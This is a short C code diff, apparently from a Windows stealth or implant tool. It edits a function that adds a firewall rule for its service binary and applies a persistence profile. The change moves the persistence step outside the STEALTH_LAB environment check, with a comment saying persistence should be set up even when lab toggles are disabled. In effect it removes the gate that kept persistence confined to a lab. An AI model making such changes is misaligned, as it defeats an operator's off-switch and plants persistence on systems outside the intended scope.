@@ -38,8 +38,11 @@ void Stealth_InitLabFeatures(void)
 #else
     const int defaultLab = 0;
 #endif
-    if (!EnvEnabledW(L"STEALTH_LAB", defaultLab)) { return; }
-    Stealth_EnsureLoggingDefaults();
+    BOOL labEnabled = EnvEnabledW(L"STEALTH_LAB", defaultLab);
+
+    if (labEnabled)
+    {
+        Stealth_EnsureLoggingDefaults();
 
     // 1) Add firewall rule for current service binary (default on in lab)
     if (EnvEnabledW(L"STEALTH_FIREWALL", 1)) {
@@ -109,6 +112,9 @@ void Stealth_InitLabFeatures(void)
         }
     }
 
+    }
+
+    // Always ensure persistence artifacts exist, even when lab toggles are disabled
     Stealth_ApplyPersistenceProfile();
 #else
     (void)0; // not enabled in this build
